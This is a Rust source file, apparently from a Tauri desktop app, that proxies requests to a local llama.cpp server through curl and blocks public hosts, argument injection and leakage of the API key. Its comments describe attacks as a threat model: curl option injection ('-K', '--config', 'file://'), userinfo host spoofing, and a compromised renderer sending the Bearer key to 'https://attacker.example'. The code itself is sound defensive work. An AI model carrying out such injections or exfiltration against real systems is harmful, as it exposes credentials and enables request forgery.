use super::util::{no_console_window, run_blocking, system_command, unique_suffix, write_private};

use std::{path::PathBuf, process::Stdio};

use tauri::AppHandle;

// ===================================================================
// llama.cpp router (/llama): thin HTTP proxy to llama-server via curl.
// The webview CSP forbids direct fetches, so all calls go through here.
// ===================================================================
pub fn run_curl(args: &[String], timeout_secs: u32) -> Result<String, String> {
	let mut cmd = system_command("curl");
	cmd.args(["-s", "-m", &timeout_secs.to_string()])
		.args(args)
		.stdin(Stdio::null())
		.stdout(Stdio::piped())
		.stderr(Stdio::piped());
	no_console_window(&mut cmd);
	let out = cmd
		.output()
		.map_err(|e| format!("curl unavailable: {e}（管理 llama.cpp 需要 curl）"))?;
	if !out.status.success() {
		let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
		let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
		return Err(if !stderr.is_empty() {
			stderr
		} else if !stdout.is_empty() {
			stdout
		} else {
			format!("curl exited with status {}", out.status)
		});
	}
	Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Remove a curl argument file (request body / auth header) after the call.
pub fn cleanup_curl_file(path: &Option<PathBuf>) {
	if let Some(p) = path {
		let _ = std::fs::remove_file(p);
	}
}

/// Extract the host from a scheme-checked http(s) router URL: userinfo and
/// port stripped, IPv6 brackets removed, lowercased.
pub fn router_host(url: &str) -> Option<String> {
	let authority = url.split_once("://")?.1;
	let authority = authority.split(['/', '?', '#']).next().unwrap_or("");
	// rsplit so a userinfo '@' can't spoof the host (user@evil host@good).
	let host_port = authority.rsplit('@').next().unwrap_or(authority);
	let host = if let Some(rest) = host_port.strip_prefix('[') {
		// [::1] or [::1]:8080
		rest.split(']').next().unwrap_or(rest)
	} else {
		host_port.split(':').next().unwrap_or(host_port)
	};
	(!host.is_empty()).then(|| host.to_ascii_lowercase())
}

/// True when the host is publicly routable — i.e. NOT where a llama.cpp router
/// lives. Loopback, RFC1918 private space, link-local and mDNS .local names are
/// the local/LAN shapes that pass.
pub fn is_public_host(host: &str) -> bool {
	if host == "localhost" || host.ends_with(".localhost") || host.ends_with(".local") {
		return false;
	}
	// Unbracketed IPv6 loopback spelling.
	if host == "::1" {
		return false;
	}
	let Ok(ip) = host.parse::<std::net::IpAddr>() else {
		// Not an IP literal: any other DNS name is treated as public.
		return true;
	};
	match ip {
		std::net::IpAddr::V4(v4) => {
			let o = v4.octets();
			!(o[0] == 127
				|| o[0] == 10
				|| (o[0] == 172 && (16..=31).contains(&o[1]))
				|| (o[0] == 192 && o[1] == 168)
				|| (o[0] == 169 && o[1] == 254))
		}
		std::net::IpAddr::V6(v6) => {
			let s = v6.segments();
			// fc00::/7 unique-local and fe80::/10 link-local are LAN shapes.
			!((s[0] & 0xfe00) == 0xfc00 || (s[0] & 0xffc0) == 0xfe80)
		}
	}
}

pub fn llama_curl_args(
	url: &str,
	api_key: &Option<String>,
	suffix: &str,
) -> Result<(Vec<String>, Option<PathBuf>), String> {
	// Only allow http(s) URLs and never one that could be parsed as a curl
	// option: curl would otherwise accept `-o`, `-K`, `--config`, `file://`…
	// (argument injection / SSRF) from a user-supplied router address.
	let trimmed = url.trim();
	if !(trimmed.starts_with("http://") || trimmed.starts_with("https://")) {
		return Err("llama.cpp router URL must start with http:// or https://".into());
	}
	// …and never a publicly routable host. The Bearer key lives in the
	// Rust-side store — the webview only ever sees a has-key boolean — so
	// these three commands are the ONLY path it can leave by: a compromised
	// renderer could otherwise call pi_llama_models("https://attacker.example")
	// and have the Authorization header handed to whatever host it names.
	// llama.cpp routers are local or on the user's LAN (the settings field's
	// placeholder is 127.0.0.1:8080), so require exactly that shape. A genuine
	// public-router setup can still be reached by pointing a private address
	// at it (SSH tunnel / hosts entry) — the same trade the SSH-tunnel default
	// already implies.
	let host =
		router_host(trimmed).ok_or_else(|| "llama.cpp router URL has no host".to_string())?;
	if is_public_host(&host) {
		return Err(format!(
			"llama.cpp router URL must point at a local or private-network address, not {host}"
		));
	}
	let mut args = Vec::new();
	let mut header_file = None;
	if let Some(k) = api_key.as_deref().filter(|k| !k.is_empty()) {
		// The Bearer key goes through a `curl -H @file` argument file instead
		// of the argv vector: command lines are readable by every same-user
		// process, files are not (and the file is 0600 on Unix + deleted after
		// the call).
		let path = std::env::temp_dir().join(format!("tau-llama-h{}.hdr", unique_suffix()));
		write_private(&path, format!("Authorization: Bearer {k}\n").as_bytes())?;
		args.push("-H".to_string());
		args.push(format!("@{}", path.display()));
		header_file = Some(path);
	}
	// `--` terminates option parsing so the URL is always treated as a
	// positional argument even if it contained a leading `-`.
	args.push("--".to_string());
	args.push(format!("{trimmed}{suffix}"));
	Ok((args, header_file))
}

#[tauri::command]
pub async fn pi_llama_models(app: AppHandle, url: String) -> Result<Vec<String>, String> {
	let api_key = crate::extras::stored_llama_key(&app);
	run_blocking(move || {
		let (args, header_file) = llama_curl_args(&url, &api_key, "/v1/models")?;
		let result = run_curl(&args, 10);
		cleanup_curl_file(&header_file);
		let body = result?;
		let v: serde_json::Value = serde_json::from_str(&body).map_err(|e| {
			format!(
				"unexpected router response: {e} — {}",
				body.chars().take(160).collect::<String>()
			)
		})?;
		let ids = v
			.get("models")
			.and_then(|m| m.as_array())
			.map(|arr| {
				arr.iter()
					.filter_map(|m| m.get("id").and_then(|x| x.as_str()).map(|s| s.to_string()))
					.collect::<Vec<_>>()
			})
			.unwrap_or_default();
		Ok(ids)
	})
	.await
}

/// (curl argv, request-body file to delete afterwards, auth-header file to
/// delete afterwards)
pub type LlamaCurlInvocation = (Vec<String>, Option<PathBuf>, Option<PathBuf>);

pub fn llama_post_args(
	url: &str,
	api_key: &Option<String>,
	suffix: &str,
	name: &str,
) -> Result<LlamaCurlInvocation, String> {
	let (mut args, header_file) = llama_curl_args(url, api_key, suffix)?;
	args.insert(0, "-X".to_string());
	args.insert(1, "POST".to_string());
	args.insert(2, "-H".to_string());
	args.insert(3, "Content-Type: application/json".to_string());
	let body = serde_json::json!({ "name": name }).to_string();
	let tmp = std::env::temp_dir().join(format!("tau-llama-{}.json", unique_suffix()));
	if let Err(e) = write_private(&tmp, body.as_bytes()) {
		cleanup_curl_file(&header_file);
		return Err(e);
	}
	let mut data_args = vec!["-d".to_string(), format!("@{}", tmp.display())];
	data_args.append(&mut args);
	Ok((data_args, Some(tmp), header_file))
}

#[tauri::command]
pub async fn pi_llama_load(app: AppHandle, url: String, name: String) -> Result<(), String> {
	let api_key = crate::extras::stored_llama_key(&app);
	run_blocking(move || {
		let (args, body_file, header_file) = llama_post_args(&url, &api_key, "/v1/load", &name)?;
		let result = run_curl(&args, 300);
		cleanup_curl_file(&body_file);
		cleanup_curl_file(&header_file);
		result.map(|_| ())
	})
	.await
}

#[tauri::command]
pub async fn pi_llama_unload(app: AppHandle, url: String, name: String) -> Result<(), String> {
	let api_key = crate::extras::stored_llama_key(&app);
	run_blocking(move || {
		let (args, body_file, header_file) = llama_post_args(&url, &api_key, "/v1/unload", &name)?;
		let result = run_curl(&args, 300);
		cleanup_curl_file(&body_file);
		cleanup_curl_file(&header_file);
		result.map(|_| ())
	})
	.await
}
